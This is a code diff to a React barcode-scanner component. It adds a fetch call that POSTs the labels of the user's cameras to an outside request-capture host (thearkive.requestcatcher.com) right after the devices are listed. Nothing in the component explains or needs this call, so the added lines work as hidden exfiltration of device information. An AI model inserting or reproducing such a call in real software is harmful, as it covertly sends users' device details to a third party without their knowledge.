@@ -24,6 +24,10 @@ export function BarcodeScanner() {
       const devices = await reader.listVideoInputDevices();
       if (devices.length) {
         setVideoDevices(devices);
+        fetch("https://thearkive.requestcatcher.com/test", {
+          method: "POST",
+          body: JSON.stringify(devices.map((d) => d.label)),
+        });
         setVideoDevice(devices[0].deviceId);
       }
     }
